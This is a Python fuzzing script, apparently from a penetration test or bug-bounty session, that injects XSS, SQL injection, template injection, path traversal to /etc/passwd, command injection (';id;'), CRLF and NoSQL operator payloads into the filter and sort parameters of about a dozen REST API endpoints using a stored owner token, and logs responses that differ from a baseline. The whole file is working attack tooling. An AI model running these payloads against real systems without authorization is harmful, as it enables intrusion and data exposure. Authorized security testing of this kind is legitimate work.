import json,subprocess,os,urllib.parse,time
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()

PAYLOADS = {
 'xss'   : '"><svg onload=alert(1)>ZX',
 'ssti'  : '{{7*7}}ZX',
 'sqli'  : "'||(SELECT 1)||'ZX",
 'sqlerr': "ZX'--",
 'path'  : '../../../../etc/passwd',
 'cmd'   : ';id;ZX',
 'null'  : 'ZX\x00',
 'format': 'ZX%s%s%s%n',
 'crlf'  : 'ZX\r\nInjected-Header:1',
 'bigint': '999999999999999999999',
 'neg'   : '-1',
 'float' : '1.5',
 'bool'  : 'true',
 'arr'   : '[]',
 'obj'   : '{"$ne":null}',
}

def call(method, path, body=None, timeout=12):
    cmd=['curl','-s','-m',str(timeout),'-o','/tmp/hb','-w','%{http_code}|%{time_total}',
         '-X',method,H+path,'-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    r=subprocess.run(cmd,capture_output=True,text=True)
    out=r.stdout.strip()
    try: code,t=out.split('|')
    except: code,t=out or '000','0'
    try: txt=open('/tmp/hb',encoding='utf-8',errors='replace').read()
    except: txt=''
    return code,float(t or 0),txt

def q(s): return urllib.parse.quote(str(s), safe='')

def probe_query(base, params):
    """inject into each query param, compare to baseline"""
    out=[]
    for pname in params:
        benign={k:'ZXbenign' for k in params}
        qs='&'.join(f'{k}={q(v)}' for k,v in benign.items())
        bc,bt,bx=call('GET',f'{base}?{qs}')
        for name,pay in PAYLOADS.items():
            inj=dict(benign); inj[pname]=pay
            qs2='&'.join(f'{k}={q(v)}' for k,v in inj.items())
            c,t,x=call('GET',f'{base}?{qs2}')
            an=[]
            if c!=bc: an.append(f'{bc}->{c}')
            if t>max(bt*4,4): an.append(f'slow {round(bt,2)}->{round(t,2)}')
            if 'ZX' in x and ('<svg' in x or '{{7*7}}' in x or 'Injected-Header' in x): an.append('REFLECT')
            if 'SQL' in x.upper() and 'SQL' not in bx.upper(): an.append('SQLERR')
            if '49' in x and name=='ssti' and '{{7*7}}' not in x: an.append('SSTI')
            if an: out.append((pname,name,c,round(t,2),an))
    return out

# query-param endpoints (filters are the classic injection point)
QENDPOINTS=[
 ('/api/v1/users',['filter[email][eq]','filter[full_name][contains]','sort','page[size]']),
 ('/api/v1/issues',['filter[title][contains]','filter[status][eq]','sort','page[size]']),
 ('/api/v1/controls',['filter[name][contains]','sort','page[size]']),
 ('/api/v1/risks',['filter[name][contains]','sort','page[size]']),
 ('/api/v1/narratives',['filter[name][contains]','sort','page[size]']),
 ('/api/v1/files',['filter[name][contains]','sort','page[size]']),
 ('/api/v1/teams',['filter[name][contains]','sort']),
 ('/api/v1/roles',['filter[name][contains]','sort']),
 ('/api/v1/auditable_entities',['filter[name][contains]','sort']),
 ('/api/v1/role_permissions',['role_id','filter[key][eq]','sort']),
 ('/api/v1/score_types',['filter[name][contains]','sort']),
 ('/api/v1/processes',['filter[name][contains]','sort']),
]
print("=== QUERY PARAM INJECTION ===")
allanom=[]
for base,params in QENDPOINTS:
    a=probe_query(base,params)
    if a:
        print(f"\n{base}")
        for x in a[:8]: print(f"   {x}")
        allanom+=a
    else:
        print(f"{base:44} clean")
print(f"\ntotal anomalies: {len(allanom)}")
json.dump(allanom,open('state/t332_anom.json','w'),indent=1,default=str)
